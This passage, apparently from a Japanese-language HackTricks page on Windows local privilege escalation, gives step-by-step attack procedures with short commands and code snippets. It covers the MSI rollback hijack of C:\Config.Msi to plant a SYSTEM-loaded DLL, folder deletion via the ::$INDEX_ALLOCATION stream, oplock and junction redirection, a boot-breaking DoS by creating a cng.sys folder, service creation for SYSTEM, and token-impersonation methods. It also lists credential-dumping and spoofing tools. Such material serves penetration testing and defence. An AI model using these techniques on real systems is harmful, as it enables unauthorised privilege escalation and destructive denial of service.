この攻撃は基本的に Windows Installer の rollback 機能を悪用し、アンインストール時に正規ファイルを悪意あるファイルに置き換えるものです。これには、攻撃者が `C:\Config.Msi` フォルダをハイジャックするための **malicious MSI installer** を作成する必要があります。後に Windows Installer が他の MSI パッケージのアンインストール中に rollback ファイルを保存するためにこのフォルダを使用し、その rollback ファイルが悪意のあるペイロードに書き換えられることになります。

手法の要約は次の通りです:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
  - `TARGETDIR`（書き込み可能なフォルダ）に無害なファイル（例: `dummy.txt`）をインストールする `.msi` を作成する。
  - インストーラを **"UAC Compliant"** にマークし、**非管理者ユーザ** が実行できるようにする。
  - インストール後、ファイルのハンドルを開いたままにしておく。

- Step 2: Begin Uninstall
  - 同じ `.msi` をアンインストールする。
  - アンインストール処理はファイルを `C:\Config.Msi` に移動し、`.rbf` ファイル（rollback バックアップ）にリネームし始める。
  - `GetFinalPathNameByHandle` を使って開いているファイルハンドルをポーリングし、ファイルが `C:\Config.Msi\<random>.rbf` になったことを検出する。

- Step 3: Custom Syncing
  - `.msi` には **カスタムアンインストールアクション (`SyncOnRbfWritten`)** が含まれており:
    - `.rbf` が書き込まれたときにシグナルを送る。
    - その後、別のイベントを待機してアンインストールを続行する。

- Step 4: Block Deletion of `.rbf`
  - シグナルを受けたら、`FILE_SHARE_DELETE` なしで `.rbf` ファイルを開く — これによりそのファイルは削除されなくなる。
  - その後、アンインストールを終了できるようにシグナルを返す。
  - Windows Installer は `.rbf` を削除できず、すべての内容を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: Manually Delete `.rbf`
  - あなた（攻撃者）は `.rbf` ファイルを手動で削除する。
  - こうして **`C:\Config.Msi` が空になる**。ハイジャックの準備が整う。

> この時点で、`C:\Config.Msi` を削除するために **SYSTEM-level arbitrary folder delete vulnerability** をトリガーする。

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
  - `C:\Config.Msi` フォルダを自分で再作成する。
  - **弱い DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持ったハンドルを開いたままにする。

- Step 7: Run Another Install
  - 同じ `.msi` を再度インストールする。ただし:
    - `TARGETDIR`: 書き込み可能な場所。
    - `ERROROUT`: 強制失敗を引き起こす変数。
  - このインストールは再度 **rollback** を引き起こすために使用され、`.rbs` と `.rbf` が読み込まれる。

- Step 8: Monitor for `.rbs`
  - `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、 新しい `.rbs` が現れるまで待つ。
  - そのファイル名をキャプチャする。

- Step 9: Sync Before Rollback
  - `.msi` には **カスタムインストールアクション (`SyncBeforeRollback`)** が含まれており:
    - `.rbs` が作成されたときにイベントをシグナルする。
    - その後、続行前に待機する。

- Step 10: Reapply Weak ACL
  - `.rbs created` イベントを受け取った後:
    - Windows Installer は `C:\Config.Msi` に対して強い ACL を再適用する。
    - しかし、あなたはまだ `WRITE_DAC` を持ったハンドルを開いているため、再び弱い ACL を適用できる。

> ACL は **ハンドルオープン時にのみ強制される** ため、引き続きフォルダへ書き込みが可能である。

- Step 11: Drop Fake `.rbs` and `.rbf`
  - `.rbs` ファイルを上書きして、Windows に次を指示する **偽の rollback スクリプト** を置く:
    - あなたの `.rbf`（悪意のある DLL）を特権のある場所（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）に復元するよう指示する。
    - SYSTEM レベルのペイロード DLL を含む偽の `.rbf` を配置する。

- Step 12: Trigger the Rollback
  - 同期イベントをシグナルしてインストーラを再開させる。
  - `ErrorOut` という **type 19 custom action** が既知のポイントでインストールを故意に失敗させるよう設定されている。
  - これにより **rollback が開始される**。

- Step 13: SYSTEM Installs Your DLL
  - Windows Installer は:
    - あなたの悪意のある `.rbs` を読み込む。
    - あなたの `.rbf` DLL をターゲットの場所にコピーする。
  - これで **SYSTEM がロードするパスに悪意のある DLL を置く** ことに成功する。

- Final Step: Execute SYSTEM Code
  - 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、ハイジャックした DLL を読み込ませる。
  - 結果として、あなたのコードが **SYSTEM として実行される**。

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

前述の主な MSI rollback 手法は、フォルダ全体（例: `C:\Config.Msi`）を削除できることを前提としています。しかし、脆弱性が **任意のファイル削除のみ** を許す場合はどうするか？

NTFS の内部（NTFS internals）を悪用できます：すべてのフォルダには隠しの別名データストリーム（alternate data stream）と呼ばれるものがあり:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームはフォルダの**インデックスメタデータ**を格納します。

したがって、フォルダの**`::$INDEX_ALLOCATION`ストリームを削除すると**、NTFSはファイルシステムからフォルダ全体を**削除します**。

次のような標準のファイル削除APIを使用してこれを行うことができます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Even though you're calling a *file* delete API, it **deletes the folder itself**.

### フォルダの内容削除から SYSTEM EoP へ
もしあなたの primitive が任意のファイル/フォルダを削除できないが、**攻撃者が制御するフォルダの *contents* を削除できる**としたら？

1. ステップ 1: 罠のフォルダとファイルを準備
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. ステップ 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとしたとき、oplock は **実行を一時停止する**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM プロセスをトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その中身を削除しようとします。
- `file1.txt` に到達すると、**oplock triggers** が動作し、コールバックに制御が渡されます。

4. Step 4: oplock callback 内で — 削除をリダイレクトする

- オプション A: `file1.txt` を別の場所に移動する
- これにより `folder1` の中身は空になりますが、oplock は維持されます。
- `file1.txt` を直接削除しないでください — それを行うと oplock が早期に解除されます。

- オプション B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを格納する NTFS の内部ストリームを狙っている — これを削除するとフォルダ自体が削除される。

5. ステップ5: oplock を解放する
- SYSTEM プロセスは続行し、`file1.txt` を削除しようとする。
- しかし今、junction + symlink のため、実際には削除しているのは：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除される。

### 任意のフォルダ作成から恒久的なDoSへ

あるプリミティブを悪用して、**SYSTEM/admin として任意のフォルダを作成できる** — たとえ **ファイルを書き込めない** または **弱い権限を設定できない** 場合でも。

**フォルダ**（ファイルではなく）を**重要な Windows driver**の名前で作成する。例：
```
C:\Windows\System32\cng.sys
```
- このパスは通常 `cng.sys` カーネルモードドライバに対応します。
- もしそれを **フォルダとして事前に作成すると**, Windows は起動時に実際の driver をロードできなくなります。
- すると、Windows は起動時に `cng.sys` をロードしようとします。
- フォルダを見つけると、**実際の driver を解決できず**, **クラッシュするか起動が停止**します。
- **フォールバックはなく**, **外部からの介入（例：ブート修復やディスクアクセス）なしには回復できません。**


## **High Integrity から SYSTEM へ**

### **新しいサービス**

すでに High Integrity プロセスで動作している場合、**SYSTEM へのパス**は単に **新しいサービスを作成して実行すること** で簡単に得られることがあります：
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービスバイナリを作成する際は、それが有効なサービスであること、または有効なサービスでない場合は必要な動作を速やかに実行することを確認してください。そうしないと、20秒で終了されます。

### AlwaysInstallElevated

High Integrity プロセスから、**AlwaysInstallElevated レジストリエントリを有効にし**、_**.msi**_ ラッパーを使ってリバースシェルを**インストール**することを試せます。\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**参照できます** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

これらのトークン権限を持っている場合（おそらく既に High Integrity のプロセスで見つかることが多い）、SeDebug 権限を使ってほとんどのプロセス（保護されたプロセスは除く）を**開き**、そのプロセスの**トークンをコピー**し、そのトークンで**任意のプロセスを作成**できます。\
この手法では通常、**すべてのトークン権限を持つ SYSTEM として実行されているプロセスを選択**します（_はい、すべてのトークン権限を持っていない SYSTEM プロセスも見つかります_）。\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

この手法は meterpreter が `getsystem` を行う際に使われます。手法は、**パイプを作成し、そのパイプに書き込ませるためにサービスを作成/悪用する**というものです。すると、**SeImpersonate** 権限を使ってそのパイプを作成した**サーバー**は、パイプクライアント（サービス）の**トークンを偽装（impersonate）**でき、SYSTEM 権限を得ることができます。\
[**learn more about name pipes you should read this**](#named-pipe-client-impersonation)。\
[**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

もし **SYSTEM として動作するプロセス**にロードされる **dll をハイジャック**できれば、その権限で任意のコードを実行できます。したがって Dll Hijacking はこの種の権限昇格に有用であり、さらに High Integrity プロセスからは **DLL をロードするフォルダに対する書き込み権限**があるため達成しやすくなります。\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## その他のリソース

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## 便利なツール

**Windows のローカル権限昇格ベクターを探すための最良ツール:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 誤設定や機密ファイルをチェックします（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。検出します。**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な誤設定をチェックして情報を収集します（**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 誤設定をチェックします**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla, RDP の保存されたセッション情報を抽出します。ローカルでは -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から資格情報を抽出します。検出済み。**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集したパスワードをドメイン全体にスプレーします**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell による ADIDNS/LLMNR/mDNS/NBNS スプーファー兼中間者ツールです。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows の権限昇格列挙**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 既知の権限昇格脆弱性を検索します（Watson に非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(管理者権限が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の権限昇格脆弱性を検索します（VisualStudio を使ってコンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson)）\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- ホストを列挙して誤設定を検索します（権限昇格より情報収集ツール寄り）（コンパイルが必要）（[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)）\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くのソフトウェアから資格情報を抽出します（GitHub にプリコンパイルされた exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 移植**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 誤設定をチェックします（GitHub にプリコンパイル実行ファイルあり）。推奨されません。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な誤設定をチェックします（python から exe 化）。推奨されません。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたツール（アクセス権チェックツール accesschk がなくても動作しますが、利用可能です）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み、動作するエクスプロイトを推奨します（ローカル python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

プロジェクトは正しいバージョンの .NET を使ってコンパイルする必要があります（[see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者ホストにインストールされている .NET のバージョンを確認するには、次を実行できます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

{{#include ../../banners/hacktricks-training.md}}
